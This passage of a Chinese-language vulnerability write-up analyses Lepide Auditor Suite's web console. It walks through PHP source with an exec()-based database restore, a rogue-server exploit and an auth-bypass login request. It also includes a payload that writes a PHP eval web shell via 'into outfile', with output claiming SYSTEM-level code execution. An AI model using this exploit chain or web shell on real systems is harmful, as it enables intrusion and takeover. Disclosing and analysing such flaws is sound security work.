&nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">}</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>该函数从受控服务端读取数据并把它们复制到一个由第22-23行uniqid()方法生成的临时文件中。最终，代码将向程序返回创建的uniqid值。</p>
<p>返回genratereports.php，可以发现<b>$restore_file</b>变量被传递到createdb()函数中，且其与getfilefromremote()创建的文件映射路径相同。现在，我们再到config.php中研究一下createdb()：</p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;<span style="color: rgb(32, 96, 160); font-size: 13px;">function</span>&nbsp;createdb<span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbfile</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$Dusername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sessionnumber</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbcreate</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">false</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">ini_set</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'max_execution_time'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">300</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//300 seconds = 5 minutes</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$server_name</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"localhost"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(192, 48, 48); font-size: 13px;">"root"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">substr</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">preg_replace</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"/[^a-z]+/"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$Dusername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">12</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sessionnumber</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$link</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_connect</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$server_name</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$username</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span>&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$password</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$link</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$user</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 128, 128); font-size: 13px;">substr</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">preg_replace</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"/[^a-z]+/"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">""</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$Dusername</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">0</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">12</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(64, 96, 64); font-size: 13px;">//$user=$user.sessionno</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$host</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"localhost"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$pass</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"123456"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$userQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"DROP USER "</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$user</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"@localhost"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$createQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"CREATE USER '<span style="font-size: 13px;">{$user}</span>'@'<span style="font-size: 13px;">{$host}</span>' IDENTIFIED BY '<span style="font-size: 13px;">{$pass}</span>'"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$grantQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"GRANT &nbsp;ALTER, ALTER ROUTINE, CREATE, CREATE ROUTINE, CREATE TEMPORARY TABLES, CREATE USER, CREATE VIEW, DELETE, DROP, EVENT, EXECUTE, FILE, INDEX, INSERT, LOCK TABLES, PROCESS, REFERENCES, RELOAD, REPLICATION CLIENT, REPLICATION SLAVE, SELECT, SHOW DATABASES, SHOW VIEW, SHUTDOWN, SUPER, TRIGGER, UPDATE ON &nbsp;*.* TO '<span style="font-size: 13px;">{$user}</span>'@'<span style="font-size: 13px;">{$host}</span>' WITH GRANT OPTION"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_query</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$userQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_query</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$createQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_query</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$grantQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">{</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dropdbQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'DROP DATABASE IF EXISTS '</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_query</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dropdbQ</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$link</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sql</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">=</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'CREATE DATABASE IF NOT EXISTS '</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$dbname</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">mysql_query</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$sql</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$link</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(160, 128, 0); font-size: 13px;">$cmd</span>&nbsp;<span style="color: rgb(0, 0, 0); font-size: 13px;">=</span>&nbsp;<span style="color: rgb(192, 48, 48); font-size: 13px;">"mysql -h&nbsp;<span style="font-size: 13px;">{$host}</span>&nbsp;-u&nbsp;<span style="font-size: 13px;">{$user}</span>&nbsp;-p<span style="font-size: 13px;">{$pass}</span>&nbsp;<span style="font-size: 13px;">{$dbname}</span>&nbsp;&lt;&nbsp;<span style="font-size: 13px;">$dbfile</span>"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span><br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<span style="color: rgb(0, 128, 128); font-size: 13px;">exec</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$cmd</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$output</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(160, 128, 0); font-size: 13px;">$return</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">;</span></span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></span></p>
<p>createdb函数试图创建一个root权限数据库账户，并把$restore_file变量作为第30和31行传递到exec()中的命令参数。</p>
<p>表面上来看，这是一个命令执行漏洞，但是，因为我们不能完全或部分直接控制其文件名（仅只是内容），并不能有效执行。但仔细想想，我们可以控制其向MySQL客户端的输入啊。基于这点，我们在实际漏洞利用阶段来做点手脚，向数据库中执行一句话木马写入，<b>漏洞利用PoC</b><a href="https://www.exploit-db.com/exploits/42297/" rel="nofollow">点此查看</a>。</p>
<p><span style="color: rgb(64, 96, 64); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(64, 96, 64); font-size: 13px;"># exploit!</span></p><p><span style="color: rgb(32, 96, 160); font-size: 13px;">if</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;send_file</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">conn</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;</span><span style="color: rgb(192, 48, 48); font-size: 13px;">"select '&lt;?php eval($_GET[e]); ?&gt;' into outfile '../../www/offsec.php';"</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">:</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<h2>漏洞利用</h2>
<p>很简单，我们要做的就是创建一个与目标系统进行交流互动的套接字服务，并提供该服务所需的输入条件。</p>
<p>我们先启动一个PoC利用脚本设置为恶意服务端，等待客户端连接：</p>
<p><span style="color: rgb(64, 96, 64); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(64, 96, 64); font-size: 13px;">root@kali:~#&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(0, 0, 0); font-size: 13px;">/</span><span style="color: rgb(0, 0, 0); font-size: 13px;">server-poc.py&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Lepide Auditor Suite createdb</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;Web Console Database Injection Remote Code Execution</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">by mr_me&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">2016</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;waiting&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">for</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;the target...</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>然后我们设置客户端172.16.175.1向Lepide Auditor登录页面和genratereport.php文件分别发起登录请求：</p>
<p><span style="color: rgb(64, 96, 64); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(64, 96, 64); font-size: 13px;">root@kali:~#&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(0, 0, 0); font-size: 13px;">/</span><span style="color: rgb(0, 0, 0); font-size: 13px;">client-poc.py 172.16.175.137 172.16.175.1</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;sending auth bypass</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;sending code execution request</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>首先，以servername=172.16.175.1&amp;username=test&amp;password=hacked向Lepide Auditor登录端发起请求：</p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(0, 0, 0); font-size: 13px;">POST /index.php HTTP/1.1</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Host: 172.16.175.137:7778</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Content-Type: application/x-www-form-urlencoded</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Content-Length: 61</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">servername=172.16.175.1&amp;username=test&amp;password=hacked&amp;submit=</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>之后，得到了一个包含认证PHPSESSID的响应，在此过程中要确保不会发生重定向或PHPSESSID值被破坏：</p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(0, 0, 0); font-size: 13px;">HTTP/1.1 302 Found</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Date: Sun, 22 May 2016 19:00:20 GMT</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Server: Apache/2.4.12 (Win32) PHP/5.4.10</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">X-Powered-By: PHP/5.4.10</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Set-Cookie: PHPSESSID=lkhf0n8epc481oeq4saaesgqe3; path=/<br /></span><span style="color: rgb(0, 0, 0); font-size: 13px;">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Pragma: no-cache</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">location: reports</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Content-Length: 8</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Content-Type: text/html</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>第二个请求触发了exec()调用上述PHPSESSID：</p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(0, 0, 0); font-size: 13px;">GET /genratereports.php?path=lol&amp;daterange=1@9&amp;id=6 HTTP/1.1</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Host: 172.16.175.137:7778</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Cookie: PHPSESSID=lkhf0n8epc481oeq4saaesgqe3</span></p></code></pre>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p><span style="color: rgb(0, 0, 0); font-size: 13px;"></span></p>
<p>最终，所有功能代码完成后，成功实现了NT AUTHORITY\SYSTEM权限的远程代码执行：</p>
<p><span style="color: rgb(64, 96, 64); font-size: 13px;"></span></p>
<pre><code><p><span style="color: rgb(64, 96, 64); font-size: 13px;">root@kali:~#&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">.</span><span style="color: rgb(0, 0, 0); font-size: 13px;">/</span><span style="color: rgb(0, 0, 0); font-size: 13px;">server-poc.py&nbsp;</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">Lepide Auditor Suite createdb</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;Web Console Database Injection Remote Code Execution</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">by mr_me&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">2016</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;waiting&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">for</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;the target...</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;connected by&nbsp;</span><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(192, 48, 48); font-size: 13px;">'172.16.175.137'</span><span style="color: rgb(0, 0, 0); font-size: 13px;">,&nbsp;</span><span style="color: rgb(0, 128, 160); font-size: 13px;">50541</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a&nbsp;</span><span style="color: rgb(32, 96, 160); font-size: 13px;">login</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;request</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a username:&nbsp;</span><span style="color: rgb(0, 128, 128); font-size: 13px;">test</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;got a password: hacked</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;sending SUCCESS packet</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span style="color: rgb(0, 0, 0); font-size: 13px;">)</span><span style="color: rgb(0, 0, 0); font-size: 13px;">&nbsp;send string successful</span></p><p><span style="color: rgb(0, 0, 0); font-size: 13px;">(</span><span style="color: rgb(0, 0, 0); font-size: 13px;">+</span><span 